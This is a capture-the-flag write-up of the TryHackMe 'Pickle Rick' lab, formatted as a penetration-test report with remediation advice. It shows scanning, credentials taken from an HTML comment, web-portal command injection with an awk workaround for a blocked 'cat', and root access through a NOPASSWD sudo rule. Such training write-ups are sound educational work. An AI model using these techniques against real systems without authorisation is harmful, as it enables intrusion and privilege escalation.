#  Security Assessment Report – Pickle Rick (TryHackMe)

**Analyst:** Felipe Campolina  
**Role:** Cybersecurity Analyst / Penetration Tester  
**Date:** March 2025  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Challenge URL:** https://tryhackme.com/room/picklerick  

---

##  Executive Summary

This report documents a comprehensive penetration test of the "Pickle Rick" challenge from TryHackMe. The objective was to exploit a Rick and Morty themed web server to retrieve three hidden ingredients that would help Rick transform back from a pickle into human form.

**Key Findings:**
- **Critical:** Hardcoded credentials in HTML source code
- **Critical:** Command injection vulnerability in web portal
- **Critical:** Misconfigured sudo permissions allowing full privilege escalation
- **High:** Sensitive information disclosure in robots.txt

**Environment:** Simulated Lab (TryHackMe Platform)  
**Target IP:** `10.10.10.123` (fictional for demonstration)

---

##  Objective

The goal of this penetration test was to simulate a real-world attack scenario. Main objectives included:

- Discovering valid user credentials.
- Gaining remote code execution (RCE) on the system.
- Escalating privileges to root.
- Extracting three hidden "ingredients" from the file system, representing flags or sensitive data.

---

##  1. Initial Reconnaissance

Performed a full TCP scan using `nmap`:

```bash
nmap -sC -sV -p- 10.10.10.123 -oN full-scan.txt
```

**Findings:**

- Port `22/tcp`: OpenSSH 8.2p1 (Ubuntu)
- Port `80/tcp`: Apache httpd 2.4.41 (Ubuntu)

---

##  2. Web Application Analysis

### Initial Web Server Assessment

Accessing the web server via browser (`http://10.10.10.123`) revealed a Rick and Morty themed homepage with limited functionality.

### Directory and File Enumeration

Used Gobuster to discover hidden directories and files:

```bash
gobuster dir -u http://10.10.10.123 -w /usr/share/wordlists/common.txt -x php,txt,html
```

**Key Discoveries:**
- `/login.php` - Authentication portal
- `/portal.php` - Restricted administrative area
- `/robots.txt` - Information disclosure

### Information Gathering

#### robots.txt Analysis
```
Wubbalubbadubdub
```
**Finding:** Potential password exposed in robots.txt file.

#### HTML Source Code Analysis
Inspecting `/login.php` source code revealed hardcoded credentials in HTML comments:

```html
<!-- username: R1ckRul3s, password: Wubbalubbadubdub -->
```

**Vulnerability Classification:** CWE-798 (Use of Hard-coded Credentials)  
**Risk Level:** Critical  
**Impact:** Complete authentication bypass

---

##  3. Authentication Bypass & Command Injection Exploitation

### Successful Authentication

Using the discovered credentials to access the administrative portal:

- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`
- **Access Point:** `/portal.php`

### Command Injection Discovery

The portal contained a command execution panel vulnerable to OS command injection.

#### Initial System Enumeration
```bash
whoami
# Output: www-data

id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a
# Output: Linux ip-10-10-123-123 4.15.0-1023-aws #23-Ubuntu...
```

#### File System Discovery
```bash
ls -la
# Output revealed: Sup3rS3cretPickl3Ingred.txt
```

#### Bypassing Command Restrictions

Standard file reading commands were blocked by the application:
```bash
cat Sup3rS3cretPickl3Ingred.txt
# Error: Command disabled
```

**Solution:** Used alternative text processing tools to bypass restrictions:
```bash
awk '{ print }' Sup3rS3cretPickl3Ingred.txt
# Output: mr. meeseek hair
```

 **First Ingredient Acquired: `mr. meeseek hair`**

**Vulnerability Classification:** CWE-78 (OS Command Injection)  
**Risk Level:** Critical  s
**OWASP Top 10:** A03:2021 – Injection

---

##  4. Privilege Escalation Analysis

### Sudo Configuration Assessment

From the compromised `www-data` user context, we performed privilege enumeration:

```bash
sudo -l
```

**Complete Output:**
```
Matching Defaults entries for www-data on ip-10-10-123-123:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on ip-10-10-123-123:
    (ALL) NOPASSWD: ALL
```

### Critical Security Misconfiguration

**Finding:** The `www-data` user has unrestricted sudo access without password authentication.

**Technical Analysis:**
- `(ALL)` - Can execute commands as any user (including root)
- `NOPASSWD` - No password required for privilege escalation
- `ALL` - Can execute any command on the system

**Vulnerability Classification:** CWE-250 (Execution with Unnecessary Privileges)  
**Risk Level:** Critical  
**Impact:** Complete system compromise

### Privilege Escalation Execution

Immediate escalation to root privileges:
```bash
sudo su -
# Successfully obtained root shell
```

**Root Access Confirmed:**
```bash
whoami
# Output: root
```

 **Privilege Escalation Successful - Full Administrative Access Achieved**

Accessed Rick’s home directory for second ingredient:

```bash
sudo awk '{ print }' /home/rick/second\ ingredients
# Output: 1 jerry tear
```

 **Second Ingredient Acquired**

---

## 🔍 5. File System Enumeration and Root Access

Performed recursive search for last ingredient:

```bash
sudo find / -type f -name '*ingredient*' 2>/dev/null
# Output: /root/3rd.txt
```

Read file as root:

```bash
sudo awk '{ print }' /root/3rd.txt
# Output: fleeb juice
```

 **Third Ingredient Acquired**

---

##  Summary of Findings

| Step                  | Technique Used                  | Result                          |
| --------------------- | ------------------------------- | ------------------------------- |
| Reconnaissance        | `nmap`, manual analysis         | Open ports, login page found    |
| Credential Discovery  | HTML Source Analysis            | Exposed credentials             |
| Remote Code Execution | Web panel exploitation          | Executed commands as `www-data` |
| Privilege Escalation  | Misconfigured `sudo` (NOPASSWD) | Root-level access achieved      |
| Flag Extraction       | `awk`, `find`                   | Retrieved all 3 ingredients     |

---

##  Comprehensive Vulnerability Assessment

| **Vulnerability** | **Classification** | **Risk Level** | **CVSS Score** | **Impact** |
|-------------------|-------------------|----------------|----------------|------------|
| Hardcoded Credentials | CWE-798 | Critical | 9.8 | Authentication Bypass |
| OS Command Injection | CWE-78 | Critical | 9.8 | Remote Code Execution |
| Sudo Misconfiguration | CWE-250 | Critical | 8.8 | Privilege Escalation |
| Information Disclosure | CWE-200 | Medium | 5.3 | Sensitive Data Exposure |

---

##  Remediation Recommendations

### Immediate Actions (Critical Priority)

1. **Remove Hardcoded Credentials**
   - Implement proper authentication mechanisms
   - Use environment variables or secure key management
   - Remove all sensitive comments from source code

2. **Fix Command Injection Vulnerability**
   - Implement input validation and sanitization
   - Use parameterized commands or safe APIs
   - Apply principle of least privilege

3. **Reconfigure Sudo Permissions**
   - Remove `NOPASSWD: ALL` from www-data user
   - Implement granular sudo permissions
   - Require password authentication

### Long-term Security Improvements

1. **Web Application Security**
   - Implement Content Security Policy (CSP)
   - Add proper error handling
   - Enable security headers (X-Frame-Options, X-XSS-Protection)

2. **System Hardening**
   - Regular security audits
   - Implement logging and monitoring
   - Apply security patches regularly

---

##  Attack Timeline

| **Time** | **Phase** | **Action** | **Result** |
|----------|-----------|------------|------------|
| T+0:00 | Reconnaissance | Nmap port scan | Identified HTTP and SSH services |
| T+0:05 | Discovery | Directory enumeration | Found login.php and robots.txt |
| T+0:10 | Intelligence | Source code analysis | Retrieved hardcoded credentials |
| T+0:15 | Exploitation | Authentication bypass | Gained access to portal.php |
| T+0:20 | Exploitation | Command injection | Achieved RCE as www-data |
| T+0:25 | Escalation | Sudo enumeration | Discovered NOPASSWD configuration |
| T+0:30 | Collection | Flag harvesting | Retrieved all three ingredients |

---

##  Technical Skills Demonstrated

### Reconnaissance & Enumeration
- Network port scanning with Nmap
- Web directory enumeration with Gobuster
- Manual source code analysis
- File system reconnaissance

### Exploitation Techniques
- Authentication bypass via hardcoded credentials
- OS command injection exploitation
- Command filtering bypass techniques
- Alternative command usage (`awk` vs `cat`)

### Privilege Escalation
- Sudo configuration analysis
- Linux privilege escalation techniques
- Post-exploitation enumeration

### General Security Skills
- Vulnerability classification (CWE/OWASP mapping)
- Risk assessment and prioritization
- Documentation and reporting
- Remediation planning

---

##  Conclusion & Lessons Learned

### Technical Summary

This penetration test successfully demonstrated a complete attack chain against the "Pickle Rick" web application, achieving full system compromise through multiple critical vulnerabilities. The assessment revealed fundamental security weaknesses that are commonly found in real-world environments.

### Key Security Lessons

**For Developers:**
- Never embed credentials in source code or comments
- Implement proper input validation for all user inputs
- Use parameterized queries and safe APIs to prevent injection attacks
- Regular security code reviews are essential

**For System Administrators:**
- Follow the principle of least privilege for all user accounts
- Avoid using `NOPASSWD` in sudo configurations
- Implement proper access controls and monitoring
- Regular security audits and penetration testing

### Real-World Relevance

The vulnerabilities demonstrated in this challenge mirror common issues found in actual production environments:

1. **Legacy Code Issues:** Many applications contain outdated authentication mechanisms
2. **Configuration Drift:** System permissions often become overly permissive over time
3. **Information Disclosure:** Sensitive data frequently leaks through various channels

### Compliance and Standards

This assessment aligns with several security frameworks:
- **OWASP Top 10 2021:** A03 (Injection), A07 (Identification and Authentication Failures)
- **NIST Cybersecurity Framework:** Identify, Protect, Detect, Respond, Recover
- **CIS Controls:** Inventory Management, Access Control, Data Protection

### Final Thoughts

The "Pickle Rick" challenge effectively demonstrates why layered security (defense in depth) is crucial. A single vulnerability might be contained, but the combination of multiple weaknesses led to complete system compromise. This reinforces the importance of comprehensive security programs that address people, processes, and technology.

**Challenge Rating:** ⭐⭐⭐⭐ (Excellent for beginners, solid practice for OSCP preparation)

---

*This report demonstrates practical application of ethical hacking techniques in a controlled environment. All activities were performed on authorized systems for educational purposes.*

